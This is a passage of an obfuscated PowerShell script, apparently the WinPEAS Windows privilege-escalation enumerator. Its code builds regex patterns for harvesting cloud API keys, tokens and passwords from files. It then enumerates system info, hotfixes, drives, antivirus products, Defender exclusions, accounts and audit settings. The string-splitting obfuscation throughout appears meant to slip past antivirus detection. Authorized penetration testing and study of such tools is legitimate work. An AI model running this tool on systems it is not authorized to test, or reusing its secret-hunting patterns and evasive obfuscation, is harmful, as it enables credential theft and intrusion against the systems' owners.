  ${R`EGe`XSear`cH}.add(("{0}{4}{1}{2}{3}" -f'Twi','r Be','arer',' Token','tte'), "(A{22}[a-zA-Z0-9%]{80,100})")
  ${rEGE`xS`EAR`CH}.add(("{2}{4}{1}{0}{3}" -f 't','it','T','er Oauth','w'), "[tT][wW][iI][tT][tT][eE][rR].{0,30}['""\\s][0-9a-zA-Z]{35,44}['""\\s]")
  ${r`eGExS`E`ArCH}.add(("{1}{3}{2}{0}" -f 'ey','Twi','ter Secret K','t'), "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{35,44}")
  ${r`EGeXs`e`ArcH}.add(("{1}{2}{4}{3}{0}{5}" -f 'I ','Typef','orm','P',' A','Key'), "tfp_[a-z0-9_\.=\-]{59}")
  ${rE`gE`xSEa`RCH}.add(("{0}{2}{1}"-f 'URLScan','API Key',' '), "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  ${REG`E`xse`ArCh}.add(("{3}{0}{2}{1}"-f 'ault','ken',' To','V'), "[sb]\.[a-zA-Z0-9]{24}")
  ${R`eGeXSe`Ar`cH}.add(("{3}{0}{1}{2}{5}{4}" -f 'nd','ex',' Acces','Ya','oken','s T'), "(t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2})")
  ${R`egEx`S`EARCH}.add(("{0}{2}{3}{1}{4}" -f 'Y','x','a','nde',' API Key'), "(AQVN[A-Za-z0-9_\-]{35,38})")
  ${REgEX`se`ArcH}.add(("{0}{4}{1}{3}{2}" -f'Yan','WS Access ','oken','T','dex A'), "(YC[a-zA-Z0-9_\-]{38})")
  ${REg`E`xsea`RcH}.add(("{1}{0}{2}"-f'K','Web3 API ','ey'), "(web3[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9_=\-]+\.[A-Za-z0-9_=\-]+\.?[A-Za-z0-9_.+/=\-]*)['""]")
  ${R`EGEX`sE`ARcH}.add(("{1}{0}{3}{2}"-f ' Secre','Zendesk',' Key','t'), "([a-z0-9]{40})")
  ${ReGExS`e`AR`Ch}.add(("{1}{0}{3}{4}{2}" -f'eri','Gen',' Key','c A','PI'), "((key|api|token|secret|password)[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if (${WEb`A`UtH}) {
  ${REGeX`S`EarCh}.add(("{3}{1}{5}{2}{0}{4}" -f'ion Basi','oriz','t','Auth','c','a'), ((("{0}{3}{5}{1}{7}{8}{4}{6}{2}"-f'ba','a-zA-Z0-9','+','sic ','{0}.={0}-','[',']','_',':')) -F  [CHAr]92))
  ${reG`ex`s`eARch}.add(("{1}{0}{3}{2}"-f 'izatio','Author','rer','n Bea'), ((("{2}{1}{3}{0}{4}"-f'Z0-9_AYJ.','z','bearer [a-','A-','=AYJ-]+')).ReplAce('AYJ','\')))
  ${REgex`SEA`RCH}.add(("{1}{5}{2}{3}{0}{4}" -f ' K','Alib','Acc','ess','ey ID','aba '), "(LTAI)[a-z0-9]{20}")
  ${rEGe`Xsea`R`ch}.add(("{2}{5}{0}{4}{1}{3}"-f 'aba S','K','Ali','ey','ecret ','b'), "(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  ${rEG`EXSE`ARch}.add(("{0}{1}{3}{2}{4}" -f 'Asan','a ','ie','Cl','nt ID'), "((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9]{16})['""])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  ${R`EGe`xsEaRCH}.add(("{0}{2}{1}" -f'AWS ','t ID','Clien'), "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")
  ${R`ege`xSEARcH}.add(("{2}{0}{1}" -f 'MW','S Key','AWS '), "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
  ${rEgExS`e`ARCh}.add(("{1}{0}{2}{3}" -f 'S Se','AW','cret',' Key'), "aws(.{0,20})?['""][0-9a-zA-Z\/+]{40}['""]")
  ${REG`eX`searCH}.add(("{3}{0}{4}{1}{5}{2}{6}"-f 'A','nc ','K','AWS ','ppSy','GraphQL ','ey'), "da2-[a-z0-9]{26}")
  ${reGEX`Sea`RCh}.add(("{3}{2}{0}{5}{4}{1}" -f'u','entials','c A','Basi',' Cred','th'), ((("{15}{4}{1}{9}{8}{6}{14}{5}{3}{7}{12}{2}{0}{10}{11}{13}" -f'a-','Z0-9]','[',']+@[a-zA-Z0-9]+q','[a-zA-','-9','Z','tf','A-','+:[a-z','zA','-Z','.',']+','0','://')).RePlACE(([Char]113+[Char]116+[Char]102),'\')))
  ${R`EGExsEAr`cH}.add(("{2}{5}{4}{6}{0}{1}{3}" -f'S','ecre','Beamer Cli','t','t','en',' '), "(beamer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](b_[a-z0-9=_\-]{44})['""]")
  ${rEgEX`Sea`RCh}.add(("{4}{0}{2}{3}{1}" -f'udi','Auth','nary',' Basic ','Clo'), "cloudinary://[0-9]{15}:[0-9A-Za-z]+@[a-z]+")
  ${RE`gexsEa`Rch}.add(("{4}{1}{3}{0}{2}"-f 'n','ok Cli','t ID','e','Facebo'), "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9]{13,17}")
  ${REgE`xs`Ea`RCh}.add(("{0}{4}{2}{1}{3}"-f'Face','u','ok Oa','th','bo'), "[fF][aA][cC][eE][bB][oO][oO][kK].*['|""][0-9a-f]{32}['|""]")
  ${rEGE`xs`earcH}.add(("{4}{3}{1}{2}{0}" -f 'y','Se','cret Ke','cebook ','Fa'), "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9a-f]{32}")
  ${reg`e`x`SEaRCh}.add(("{0}{3}{2}{4}{1}" -f 'Jenkins C','s','e','r','d'), "<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<")
  ${r`eGExS`Earch}.add(("{1}{2}{0}"-f ' Secret','Generi','c'), "[sS][eE][cC][rR][eE][tT].*['""][0-9a-zA-Z]{32,45}['""]")
  ${RE`GEx`s`eARCH}.add(("{1}{2}{0}" -f 'c Auth','Bas','i'), ("{0}{3}{1}{2}"-f'//(',':(','.+)@','.+)'))
  ${ReGexSe`Ar`CH}.add(("{1}{0}{2}" -f'as','PHP P','swords'), ((("{7}{20}{5}{14}{16}{6}{10}{9}{3}{11}{0}{4}{8}{2}{18}{17}{1}{12}{15}{21}{19}{13}"-f'.*[','sgw*','].+','buserLwqdbpa','=','p','wqP','(pwdL',':','WORDLwqd','ASSWDLwqPASS','ssLwqpassVfj)','passLwqysgw*p','*userLwqysgw*datab)','asswdLwq','wdLwqy','passwordL','j(y','Lwqdefine ?ysg(Vf','w','wq','sg')).rePlAcE('Vfj',[STRInG][cHAr]39).rePlAcE('Lwq','|').rePlAcE(([cHAr]121+[cHAr]115+[cHAr]103),[STRInG][cHAr]92)))
  ${rE`GExS`eARCh}.add(("{3}{2}{6}{4}{5}{0}{8}{1}{9}{7}"-f 's (','d / Creden','o','C','re','t','nfig Sec','ials)','Passw','t'), ((("{12}{19}{27}{36}{30}{10}{42}{21}{3}{29}{23}{13}{22}{32}{20}{0}{5}{11}{14}{25}{15}{39}{16}{6}{9}{35}{31}{4}{18}{33}{38}{28}{43}{7}{34}{8}{1}{2}{37}{24}{17}{41}{40}{44}{26}" -f'-9','ncrypt','io','*m8','-zA','_','86secret:m8','Qt','t-e','6secretName:m86^kind:','re',']?Secret','pa','kind','m8','zA','v:m','vide','-Z0-','ssw','Z0','n.',':[^a-z','^','ro','6[^a-','fig','d.*m','tionm86','6','c','^a','A-','9_]?Encry','-pQ','[','86','npQt-p','ptionConfigura','-Z0-9_]en','t-','rpQ','de','p','con'))  -crePLACe'm86',[Char]124 -rEpLaCE ([Char]112+[Char]81+[Char]116),[Char]92))
  ${ReG`EXSe`AR`cH}.add(("{1}{4}{3}{2}{0}{5}"-f'ns searc','Generiac','toke',' ',' API','h'), "(access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key| amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret| api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret| application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket| aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password| bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key| bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver| cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret| client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password| cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|conn.login| connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test| datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password| digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd| docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid| dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password| env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if(${fUl`lch`ECk}){${e`xC`El} = ${T`RUE}}

${r`E`gE`XSeArCH}.add("IPs", ((("{12}{11}{20}{35}{31}{29}{3}{26}{23}{27}{34}{5}{1}{41}{18}{32}{0}{10}{13}{2}{8}{15}{22}{7}{28}{4}{36}{6}{30}{24}{21}{25}{17}{38}{14}{40}{39}{16}{37}{33}{19}{9}"-f 'Nl52','9o','0-9]Nl5[',']?',')m9o.(25',']?)m','0-4][','0','01]?[0',')','[0-','5','(2','4][','?)m9','-',']Nl52','[0-9','25[0','[0-9]Nl5[01]?[0-9][0-9]?','[0-',']','9][','9][0','Nl5[01','?[0-9]','[0-','-','-9]?','01','0-9]','0-9]Nl5[','-5]','4]','9','5]Nl52[0-4][','[0-5]Nl52[','[0-',']','0-5','o.(25[','.(')).REPLaCe('Nl5','|').REPLaCe('m9o',[STRINg][chAr]92)))
${drI`V`es} = &("{1}{0}{2}"-f't-PS','Ge','Drive') | &("{0}{3}{2}{1}"-f 'Where-Obj','t','c','e') { ${_}.Root -like "*:\" }
${fILEeXT`E`N`Si`OnS} = @(("{1}{0}" -f'ml','*.x'), ("{1}{0}"-f 't','*.tx'), ("{1}{0}"-f'conf','*.'), ("{2}{1}{0}"-f 'fig','on','*.c'), ("{0}{1}"-f '*.c','fg'), ("{1}{0}" -f'ni','*.i'), ("{0}{1}"-f '.y','*ml'), ("{1}{0}"-f'g','*.lo'), ("{1}{0}"-f 'k','*.ba'), ("{0}{1}"-f'*.','xls'), ("{1}{0}{2}" -f '.xls','*','x'), ("{1}{2}{0}"-f'sm','*','.xl'))



${s`T`OPWaT`Ch} =  ( vARiAble nMWDE  -VALU )::StartNew()

if (${FUL`lcHe`Ck}) {
  &("{0}{1}{2}"-f'Wr','i','te-Host') ("{22}{10}{12}{21}{16}{32}{5}{18}{34}{13}{30}{3}{17}{9}{24}{33}{29}{2}{11}{23}{26}{28}{27}{19}{0}{31}{8}{7}{1}{4}{25}{15}{14}{20}{6}"-f ' ch','ser','e','antly i','n',' will ','words.**','r U',' fo',' ','l Chec','g','k','ni',' P','/','Enabled.','ncrease','s','r','ass',' ','**Ful','istry ','false po','ames ','/ f','de','ol','es in r','fic','eck',' This','sitiv','ig')
}

&("{0}{1}{2}"-f 'Write-Ho','s','t') -BackgroundColor ("{1}{0}"-f'ed','R') -ForegroundColor ("{1}{0}" -f 'hite','W')  ("{11}{12}{0}{5}{7}{6}{10}{9}{1}{4}{3}{8}{2}" -f' - Wi','ri',' Script','alation ','vilege Esc','ndo','s ','w','Awesome','cal P','lo','ADV','ISORY: WinPEAS')
&("{2}{1}{0}"-f'Host','e-','Writ') -BackgroundColor ("{0}{1}" -f'Re','d') -ForegroundColor ("{0}{1}"-f 'Wh','ite') ("{13}{2}{20}{10}{1}{14}{3}{7}{22}{18}{9}{21}{17}{12}{15}{16}{5}{4}{6}{19}{8}{11}{0}"-f'ly','ed f','AS should','uthorized','du','e','cat',' pe','nal p','o','be us','urposes on','ng a','WinPE','or a','nd/o','r ','i','ti','io',' ','n test','netra')
&("{2}{1}{0}{3}"-f 'Hos','e-','Writ','t') -BackgroundColor ("{1}{0}" -f'ed','R') -ForegroundColor ("{0}{1}" -f'Wh','ite') ("{14}{7}{20}{2}{0}{16}{4}{6}{21}{1}{3}{13}{10}{19}{15}{5}{12}{11}{9}{17}{18}{8}"-f's','l not','su',' be the r','oftwa',' ','re w','y','r','y other col','bilit','f an','or o','esponsi','An','the author','e of this s','lab','orato','y of ',' mi','il')
&("{0}{2}{1}"-f 'Write','ost','-H') -BackgroundColor ("{1}{0}"-f'ed','R') -ForegroundColor ("{1}{0}"-f 'te','Whi') ((("{5}{0}{8}{13}{17}{19}{21}{12}{15}{3}{6}{16}{2}{14}{18}{7}{4}{1}{11}{9}{10}{20}"-f 'it at y','xp','tw','o','s e','Use ','r w','cF','ou','t per','miss','lici','n','r own ','ork o','d/','ith the ne','ne','wneru','two','ion','rks a')).REpLaCe('ucF',[STrIng][CHAR]39))



&("{2}{1}{0}" -f 'st','rite-Ho','W') -ForegroundColor ("{1}{0}" -f 'd','re')  ("{12}{9}{1}{4}{13}{10}{3}{0}{2}{11}{5}{7}{8}{14}{6}" -f'le',' ','ge over ','rivi','spe','n objec','uration','t or misconf','i','tes','ial p','a','Indica','c','g')
&("{0}{1}{2}"-f 'Write-Ho','s','t') -ForegroundColor ("{0}{1}" -f 'gre','en')  ("{1}{2}{10}{7}{0}{4}{9}{12}{3}{8}{5}{11}{6}{13}"-f 'es prote','I','ndic','is en','c','hing ','ll conf','t','abled or somet','tio','a','is we','n ','igured')
&("{1}{2}{3}{0}"-f't','Wr','ite-H','os') -ForegroundColor ("{0}{1}" -f'cy','an')  ("{4}{1}{0}{2}{3}" -f 'es a','t','ctive ','users','Indica')
&("{0}{3}{1}{2}"-f'Wr','te','-Host','i') -ForegroundColor ("{0}{1}" -f 'Gra','y')  ("{3}{2}{5}{1}{0}{4}"-f'ed us',' disabl','e','Indicat','ers','s')
&("{2}{0}{1}"-f'-Hos','t','Write') -ForegroundColor ("{0}{1}"-f'yello','w')  ("{3}{1}{0}{2}" -f'tes ','ndica','links','I')
&("{0}{2}{1}" -f 'W','Host','rite-') -ForegroundColor ("{0}{1}"-f'Blu','e') ("{2}{3}{1}{4}{0}"-f'title','tes','Indic','a',' ')


&("{1}{0}{2}{3}"-f'te','Wri','-Hos','t') ("{20}{10}{7}{11}{3}{0}{18}{22}{17}{8}{4}{9}{21}{15}{12}{13}{14}{1}{19}{2}{6}{5}{16}"-f' lo','ows-har','ening/ch','indows','e: htt','alatio','ecklist-windows-privilege-esc',' find a',' her','ps','an',' W','cktric','ks.xy','z/wind','k.ha','n','ist','ca','d','You c','://boo','l PE Checkl') -ForegroundColor ("{1}{0}{2}" -f'lo','Yel','w')







&("{1}{3}{2}{0}" -f 'st','Wri','-Ho','te') ""
if (${Ti`mEsta`Mp}) { &("{0}{1}{2}"-f'Ti','meElaps','ed') }
&("{1}{0}{2}" -f 'rite-H','W','ost') ((("{12}{7}{15}{19}{6}{16}{2}{9}{21}{20}{10}{18}{17}{13}{4}{1}{11}{14}{3}{5}{0}{8}"-f'=====','=','===','===','==','==','=','=======','=====','=====','}{0}SYSTEM I','======','=====',' {0}{0}==========','==','===========','=','RMATION','NFO','=','{0','=='))-f [ChAr]124)
("{4}{11}{1}{2}{15}{8}{19}{9}{6}{14}{20}{12}{3}{5}{16}{13}{17}{21}{7}{0}{10}{18}"-f' c','wing ','infor','st ','The fol','o','get a fu',' run the','on is cura',' To ','mdlet get-compu','lo','li','em in','ll','mati','f syst','formation','terinfo','ted.',' ',',')


&("{0}{2}{1}"-f'syst','info.exe','em')



&("{2}{1}{0}" -f'ost','te-H','Wri') ""
if (${T`IM`e`StaMp}) { &("{1}{2}{3}{0}"-f 'Elapsed','T','im','e') }
&("{0}{2}{1}"-f'W','e-Host','rit') -ForegroundColor ("{1}{0}" -f'ue','Bl') ((("{2}{5}{3}{4}{1}{0}"-f 'S','OTFIXE','=========leYleY W','S ','H','INDOW'))  -rePlacE  'leY',[chAR]124)
&("{1}{2}{0}" -f 'st','Wri','te-Ho') ((("{3}{15}{13}{12}{18}{17}{11}{5}{10}{19}{6}{4}{20}{0}{7}{2}{8}{16}{14}{9}{1}{21}"-f 's://','o','ub.com/','=59K Check','h','ith W',' ','gith','rasta-','ts','a','ble w','o','d','/Wa',' if win','mouse','era','ws is vuln','tson','ttp','n')).RePlAce('59K','|')) -ForegroundColor ("{2}{1}{0}" -f'w','llo','Ye')
&("{1}{3}{0}{2}" -f 'e-Hos','W','t','rit') (("{23}{9}{21}{14}{11}{24}{18}{6}{25}{8}{17}{15}{26}{16}{2}{5}{13}{0}{3}{12}{10}{4}{19}{20}{22}{7}{1}" -f '2/','vCheck.bat)','c','blob/ma','r/W','om/c','it','inPri','(','o','e','ible e','st','odingo/OSCP-','s','/git','ub.','https:/','lo','in','do','s','ws/W','P','xp','s ','h')) -ForegroundColor ("{1}{0}{2}" -f 'el','Y','low')
${hOt`Fix} = &("{2}{1}{0}"-f 'x','et-HotFi','G') | &("{0}{2}{1}"-f'Sort-Obj','ct','e') -Descending -Property ("{0}{2}{1}" -f 'I','talledOn','ns') -ErrorAction ("{2}{3}{1}{0}"-f'tinue','n','Silently','Co') | &("{0}{3}{4}{2}{1}" -f 'Sele','t','-Objec','c','t') ("{0}{1}"-f'HotfixI','D'), ("{0}{1}{2}" -f'Descr','ipt','ion'), ("{1}{2}{3}{0}" -f 'edBy','I','ns','tall'), ("{0}{2}{1}" -f 'Insta','edOn','ll')
${hoT`F`iX} | &("{0}{1}{3}{2}"-f 'For','m','able','at-T') -AutoSize



&("{1}{3}{2}{0}"-f'Host','W','-','rite') ""
if (${t`iMES`TA`Mp}) { &("{3}{0}{2}{1}"-f 'im','d','eElapse','T') }
&("{2}{1}{0}" -f 'st','ite-Ho','Wr') -ForegroundColor ("{0}{1}" -f'Bl','ue') ((("{2}{6}{0}{4}{1}{3}{5}"-f'ebKe','LL UPDAT','========','ES INST','bK A','ALLED','='))-crePlacE'ebK',[chAR]124)






${sEssI`oN} = (&("{3}{2}{1}{0}"-f'ct','je','Ob','New-') -ComObject ("{4}{6}{3}{2}{1}{5}{0}" -f'ion','t','da','t.Up','Mic','e.Sess','rosof'))

${hIst`O`RY} = ${se`sSI`On}.QueryHistory("", 0, 1000) | &("{1}{0}{2}"-f'lect-Obj','Se','ect') ("{2}{3}{0}{1}" -f 'ltC','ode','Res','u'), ("{1}{0}"-f 'te','Da'), ("{1}{0}" -f'le','Tit')


${Hotfi`xU`NiQUe} = @()


${hOTFIXREt`U`R`NNUM} = @()


for (${i} = 0; ${i} -lt ${his`TO`RY}.Count; ${I}++) {
  ${chE`CK} = &("{2}{1}{0}" -f 'D','FixI','returnHot') -title ${hIs`To`RY}[${I}].Title
  if (${hOTF`iX`Un`IQUE} -like ${c`He`ck}) {
    
  }
  else {
    ${Hot`FiXuN`IqUE} += ${Ch`E`cK}
    ${HOt`FIXRe`TUR`NnUM} += ${i}
  }
}
${F`in`A`lhOTFI`XlisT} = @()

${hOTFI`XreTu`RN`NUM} | &("{2}{1}{0}"-f 'bject','h-O','ForEac') {
  ${ho`TfI`xiteM} = ${His`To`Ry}[${_}]
  ${Re`S`UlT} = ${H`O`TfIxitEM}.ResultCode
  
  switch (${RES`U`lT}) {
    1 {
      ${R`esU`LT} = ("{4}{2}{1}{3}{0}" -f'ed','per','issing/Su','sed','M')
    }
    2 {
      ${RE`Su`LT} = ("{1}{0}" -f'ceeded','Suc')
    }
    3 {
      ${RES`U`LT} = ("{4}{1}{2}{3}{0}{5}"-f'ded With Erro','u','cce','e','S','rs')
    }
    4 {
      ${r`esUlT} = ("{0}{1}" -f 'Fai','led')
    }
    5 {
      ${rESU`lt} = ("{1}{0}{2}" -f 'a','C','nceled')
    }
  }
  ${fi`N`ALHO`TfixlIsT} += [PSCustomObject]@{
    Result = ${re`sUlT}
    Date   = ${HO`Tfixit`em}.Date
    Title  = ${hotfi`X`I`TEm}.Title
  }    
}
${FI`NAlHOtf`ixlIsT} | &("{1}{2}{0}"-f't-Table','F','orma') -AutoSize


&("{1}{2}{0}" -f'st','Wr','ite-Ho') ""
if (${T`iM`EstaMp}) { &("{1}{0}{2}"-f 'imeElap','T','sed') }
&("{0}{2}{1}" -f'Writ','Host','e-') -ForegroundColor ("{1}{0}" -f'e','Blu') ((("{4}{1}{3}{2}{0}" -f 'nfo','=','={0}{0} Drive I','===','===='))  -f  [CHaR]124)

&("{1}{2}{0}"-f '-Type','A','dd') -AssemblyName ("{3}{0}{2}{1}" -f'stem.Mana','ment','ge','Sy')


${Di`skSeaRc`h`eR} = &("{1}{2}{3}{0}"-f 'ct','New-','Ob','je') ("{5}{0}{9}{1}{6}{4}{8}{10}{7}{3}{2}" -f 'nt','a','er','Search','em','System.Manageme','g','ject','en','.Man','tOb')(("{11}{0}{9}{12}{5}{4}{2}{6}{8}{3}{10}{7}{1}" -f 'E',' = 3','n32','Disk WHERE Dri','M Wi','FRO','_Logic','Type','al','CT ','ve','SEL','* '))


${SY`St`EmdrIV`ES} = ${DIs`kS`E`ArchER}.Get()


foreach (${dr`iVE} in ${SYs`T`EmDRIv`es}) {
  ${D`RIv`el`eTTer} = ${Dri`VE}.DeviceID
  ${DrIVe`L`A`BeL} = ${Dr`iVE}.VolumeName
  ${d`RIV`Esize} =  $H3A::Round(${DR`IVe}.Size / 1GB, 2)
  ${dr`i`VefrEe`sp`ACE} =  $h3a::Round(${dR`IVE}.FreeSpace / 1GB, 2)

  &("{0}{2}{3}{1}" -f'Writ','ut','e-','Outp') ('Dri'+'ve: '+"$driveLetter")
  &("{2}{0}{3}{1}"-f'ite-','tput','Wr','Ou') ('Lab'+'el'+': '+"$driveLabel")
  &("{2}{1}{0}"-f'utput','O','Write-') ('Size:'+' '+"$driveSize "+'GB')
  &("{2}{0}{3}{1}" -f '-','utput','Write','O') ('Fr'+'ee '+'Spa'+'c'+'e: '+"$driveFreeSpace "+'GB')
  &("{0}{3}{1}{2}"-f 'Wr','te-Ou','tput','i') ""
}


&("{1}{0}{2}"-f'rite-','W','Host') ""
if (${time`S`TaMP}) { &("{0}{1}{2}" -f'Tim','eEla','psed') }
&("{2}{1}{0}{3}"-f 'e-','t','Wri','Host') -ForegroundColor ("{0}{1}" -f 'Blu','e') ((("{1}{5}{4}{9}{7}{0}{10}{2}{11}{8}{3}{12}{6}" -f'ec','=========zkrzkr','on (attemp','r','nti',' A','ll)','s Det','ng to ','viru','ti','i','ead exclusions as we')) -CRePlAcE'zkr',[cHar]124)
&("{1}{0}"-f'IC','WM') ("{1}{3}{2}{0}"-f'ost','/Nod','calh','e:lo') ((("{2}{7}{10}{3}{4}{1}{5}{0}{8}{6}{9}" -f'{0}Secu','}','/','spac','e:{0}{0','root','ente','Nam','rityC','r2','e')) -f [chaR]92) ("{0}{1}" -f'Pa','th') ("{0}{2}{3}{1}"-f 'A','t','nti','VirusProduc') ("{1}{0}" -f 't','Ge') ("{0}{1}{2}{3}" -f 'di','spla','yN','ame')
&("{3}{2}{1}{0}"-f'm','dIte','l','Get-Chi') ((("{9}{7}{2}{11}{8}{10}{1}{3}{4}{15}{5}{13}{0}{6}{14}{12}"-f 'efende','ros','ry:','oft{0}Wi','nd','ws','r{0}Exc','ist','HKLM{0}SOFTWA','reg','RE{0}Mic',':','ons',' D','lusi','o'))  -F [CHaR]92) -ErrorAction ("{3}{1}{0}{2}"-f'entlyContinu','il','e','S')


&("{2}{3}{1}{0}" -f't','e-Hos','Wr','it') ""
if (${T`I`MesTAMP}) { &("{0}{1}{2}"-f 'Tim','eElapse','d') }
&("{0}{2}{1}" -f 'Write-H','t','os') -ForegroundColor ("{0}{1}" -f 'Bl','ue') ((("{7}{2}{0}{6}{5}{1}{4}{3}"-f '==','CCOUN','==','Info','TS ','A','=v9Zv9Z NET ','====')) -REPlAce'v9Z',[chaR]124)
&("{0}{1}" -f 'ne','t') ("{1}{0}"-f 'ounts','acc')


&("{1}{0}{2}"-f 'te-Hos','Wri','t') ""
if (${timE`St`AmP}) { &("{0}{2}{1}" -f'TimeElap','ed','s') }
&("{0}{2}{3}{1}"-f 'W','Host','rit','e-') -ForegroundColor ("{1}{0}" -f'lue','B') ((("{6}{0}{2}{1}{4}{3}{5}"-f'==','fThfT','====',' S','h REGISTRY','ETTINGS CHECK','==='))  -REPLacE([CHaR]102+[CHaR]84+[CHaR]104),[CHaR]124)

 
&("{2}{3}{0}{1}"-f 's','t','Wr','ite-Ho') ""
if (${T`I`meSt`AMP}) { &("{2}{0}{1}" -f 'se','d','TimeElap') }
&("{0}{2}{1}" -f'Writ','st','e-Ho') -ForegroundColor ("{1}{0}" -f 'e','Blu') ((("{3}{2}{0}{4}{1}{5}" -f't Log Se','in','0}{0} Audi','========={','tt','gs'))-F [cHAr]124)

if ((&("{2}{1}{0}"-f 'th','est-Pa','T') (("{4}{10}{11}{15}{0}{13}{12}{7}{1}{6}{16}{3}{14}{9}{5}{2}{8}" -f 'c','rCurren','diti','c','HKLM:iYrSOFT','rAu','tVersi','wsiY','Yr','iY','WARE','iY','ftiYrWindo','roso','iesiYrSystem','rMi','oniYrPoli')).rEpLACE('iYr',[sTRing][Char]92)).Property) {
  &("{0}{1}{2}" -f 'Get-I','te','m') -Path (("{7}{1}{9}{10}{20}{24}{6}{3}{5}{19}{11}{23}{17}{12}{16}{15}{0}{2}{14}{18}{13}{21}{8}{22}{4}" -f'onVQ','KL','tPoli','of','Qt','tV','Micros','H','QtAudit','M:','V','tW','owsVQtCurre','VQtS','cie','si','ntVer','d','s','Q','QtS','ystemV','V','in','OFTWAREVQt')).ReplAcE('VQt',[sTRING][CHaR]92)
}
else {
  &("{1}{0}{2}{3}"-f'ite','Wr','-','Host') ("{8}{4}{1}{3}{5}{6}{9}{7}{2}{0}" -f'd.','di','n','t',' Au',' Lo','g settings, n',' entry fou','No','o registry')
}

 
&("{0}{1}{2}" -f'Write','-Ho','st') ""
if (${ti`MeS`T`AmP}) { &("{0}{2}{1}" -f'Time','sed','Elap') }
&("{2}{1}{0}" -f 'e-Host','it','Wr') -ForegroundColor ("{0}{1}" -f'B','lue') ((("{7}{6}{10}{3}{0}{8}{13}{2}{5}{4}{14}{1}{9}{12}{11}" -f ' Windows','d (WEF)','F','=1OJ1OJ','a','orw','==','==',' Even',' r','====','istry','eg','t ','r'))  -cREpLaCE ([ChAR]49+[ChAR]79+[ChAR]74),[ChAR]124)
if (&("{2}{0}{1}"-f 'a','th','Test-P') ((("{0}{4}{19}{9}{15}{1}{12}{5}{14}{20}{11}{10}{13}{16}{3}{6}{8}{2}{17}{18}{7}"-f'HKL','AR','cri','g{0}','M','oso','E','ger','ventForwarding{0}Subs','T','{0}E','Windows','E{0}Policies{0}Micr','v','ft{','W','entLo','ption','Mana',':{0}SOF','0}'))  -F [Char]92)) {
  &("{1}{0}"-f'-Item','Get') ((("{1}{11}{19}{18}{16}{7}{0}{15}{6}{17}{12}{3}{8}{10}{9}{4}{5}{14}{2}{13}"-f 'olicies{0}M','H','ptionMa','0}Windows{0}E','ventForwa','rding{0}Subs','f','0}P','vent','0}E','Log{','KL','{','nager','cri','icroso','}SOFTWARE{','t','{0','M:'))-F[cHar]92)
}
else {
  &("{0}{2}{1}" -f 'Write-','ost','H') ("{1}{7}{3}{10}{0}{9}{2}{5}{4}{8}{6}"-f 'rded, ','Logs a',' ',' being f','ntry ','e','und.','re not','fo','no registry','owa')
}

 
&("{0}{2}{1}" -f'W','te-Host','ri') ""
if (${T`imE`stAMP}) { &("{0}{1}{2}" -f'Tim','e','Elapsed') }
&("{0}{1}{2}"-f'Wri','te','-Host') -ForegroundColor ("{0}{1}"-f'B','lue') ((("{3}{0}{4}{5}{1}{2}"-f'===','0}{0} LAPS Ch','eck','=====','=','{')) -F [chaR]124)
